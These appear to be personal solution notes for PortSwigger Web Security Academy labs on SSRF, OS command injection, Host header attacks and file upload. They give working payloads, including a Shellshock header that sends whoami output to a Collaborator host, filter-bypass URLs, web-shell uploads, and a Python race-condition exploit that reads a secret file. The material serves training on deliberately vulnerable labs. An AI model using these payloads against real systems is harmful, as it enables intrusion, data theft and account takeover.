## Server-side request forgery (SSRF) ✅
1. <b>Basic SSRF against the local server</b> - Go to one product from the home page and press `check stock`(intercept it with burp) send it to repeater and you will find a parameter named `stockApi` which has a url. In this url if we put `http://localhost/admin` and send the request we will see the admin panel. To solve this lab we have to put in `stockApi` param `http://localhost/admin/delete?username=carlos`
2. <b>Basic SSRF against another back-end system</b> - network pivoting send requests to intruder and `stockApi=http://192.168.0.$ip$:8080/admin` 
3. <b>SSRF with blacklist-based input filter</b> - `http://127.1/%2561dmin/delete?username=carlos`
4. <b>SSRF with filter bypass via open redirection vulnerability</b> - `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
5. <b>Blind SSRF with out-of-band detection</b> - Go to home page and press one of products while you intercepting the requests and you will see the `referer` header. After that go to `burp collaborator` and change the `referer` value to http://xxxxx.collaboratorburp.net and the lab is solved. 
6. <b>SSRF with whitelist-based input filter</b> - For this lab we have to get the access to admin panel and delete carlos account but its not the same like the old times. For the solution the first step is to go in one product and press `check stock` and pass this url into to `api parameter` `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`
7. <b>Blind SSRF with Shellshock exploitation</b> - Solution for tihs labs is combination of the `Blind SSRF with out-of-band detection` and the `SSRF network pivoting`. First of all we have to intercept a requests when we send a get requests for a product and send it to `intruder` after that we can see `User-Agend` & `Referer` headers so far so good.
For exploitation part:<br>
<b>User-Agent header</b> - Delete the old string and paste this payload: <br>
`() { :; }; /usr/bin/nslookup $(whoami).4diew0hehvzuachcyn7t9rpax13s3gs.burpcollaborator.net` <br>
<b>Referer header</b> - Delete the old strings and put the ip `http://192.168.0.X:8080/` but and the X letter we have to put the $ symbols and in payload tab we have to choose `numbers` starting from 1 to 255 with step 1 and start the attack. After a few requests we can see our results in burpcollaborator.

## OS command injection
1. <b>OS command injection, simple case</b> - Go to `https://xxxx.web-security-academy.net/product?productId=x` and start intercepting from burp while pressing the check stock button. Send it to repeater and chain the `whoami` command at the end of productId=x `productId=333;whoami&storeId=1`
2. <b>Blind OS command injection with time delays</b> - Go to <b>submit feedback</b> and submit the form and intercept the request. To solve this lab your email param has to look like this `&email=aa%26+ping+-c+10+127.0.0.1+%26`


## HTTP Host header attacks
1. <b>Basic password reset poisoning</b> - To solve this lab first of all we have to use the "forgot the password" functionality.<br>
Go to login page and click "forgot the password" <br>
Go to the exploit server and open the email client. Observe that you have received an email containing a link to reset your password. Notice that the URL contains the query parameter `temp-forgot-password-token.` <br>
Click the link and change your password to what ever but first you have to intercept the request and send it to repeater <br>
For the next step you have to change the `HOST` header at your request in repeater to your exploit server url `exploit-xxx.web-security-academy.net` change to username to `carlos` and send the request. <br>
Go to exploit server and press the button `access log` and you will see a `GET` request with the token for password reset <br>
The final steps is to go in the first email and press the link for reset password and after that you have to change the token in the url to the new one and change the password to something new.
2. <b>Host header authentication bypass</b> - To solve this lab we need to go to /admin(admin panel) and delete carlos account. To do that follow these steps:<br>
Intercept the get requests to the xxxxx.lab.com/admin and send it to repeater <br>
Press <b>Send</b> and you will see this message <b>Admin interface only available to local users</b> <br>
The last step is to change <h>host</b> header value to localhost and send again the reqeusts and after that we will get admin panel access.
3. <b>Web cache poisoning via ambiguous requests</b> - 
4. <b></b> - 
5. <b></b> - 
6. <b></b> - 

## File upload vulnerabilities ✅
1. <b>Remote code execution via web shell upload</b> - Try to upload just a php script with .php extension
2. <b>Web shell upload via Content-Type restriction bypass</b> - Try to change <b>content-type</b> from x-php to <b>image/png</b>
3. <b>Web shell upload via path traversal</b> - Change the <b>filename</b> from burpsuite intercept to <b>..%2fget_flag.php</b> and get the flag to /files/avatars/../get_flag.php
4. <b>Web shell upload via extension blacklist bypass</b> - Change the filename from <b>.php</b> extension to <b>.phtlm</b> extension and upload it
5. <b>Web shell upload via obfuscated file extension</b> - Intercept upload request and change the filename with extension <b>.php%00.png</b> - <b>Null byte technique</b>
6. <b>Remote code execution via polyglot web shell upload</b> - For this lab we have to use <b>exiftool</b> and one random .jpg or .png image. The exploitation part `exiftool -comment="<?php system('badstuff');?>" image_name.png or .jpg -o get_flag.php` after that a php file will created with get_flag.php name upload it and redirect into it to get the flag.
7. <b>Web shell upload via race condition</b> - At the lab description we can find a <b>hint</b> which has inside the source code of upload functionality.
Lets explain the code
```php
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}
```
"As you can see from the source code above, the uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed. "
<br>
So I create a exploit with python multithreading,requests modules just to grab the flag.
```python
import requests
import threading

def upload_exploit():
	burp0_url = "https://0aa000fc0444aa3dc03a8981009500e6.web-security-academy.net:443/my-account/avatar"
	burp0_cookies = {"session": "sbjdev7ZM9sCuhQ2irsKrh0SjX7wddRT"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0aa000fc0444aa3dc03a8981009500e6.web-security-academy.net/my-account", "Content-Type": "multipart/form-data; boundary=---------------------------35393652352872705425704695024", "Origin": "https://0aa000fc0444aa3dc03a8981009500e6.web-security-academy.net", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
	burp0_data = "-----------------------------35393652352872705425704695024\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"get_flag.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php system('cat /home/carlos/secret')?>\n\r\n-----------------------------35393652352872705425704695024\r\nContent-Disposition: form-data; name=\"user\"\r\n\r\nwiener\r\n-----------------------------35393652352872705425704695024\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\nHEhkjls5YL1vQsQRNl2qJrpSAqeAsGMK\r\n-----------------------------35393652352872705425704695024--\r\n"
	requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


def get_flag():
	endpoint = "https://0aa000fc0444aa3dc03a8981009500e6.web-security-academy.net:443/files/avatars/get_flag.php"
	r=requests.get(endpoint)
	print(r.text)
	

t1 = threading.Thread(target=upload_exploit, name='t1')
t2 = threading.Thread(target=get_flag, name='t2')  
  
t1.start()
t2.start()
  
t1.join()
t2.join()

```

 [More tricks about file upload vulnerabilities](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#upload-tricks)
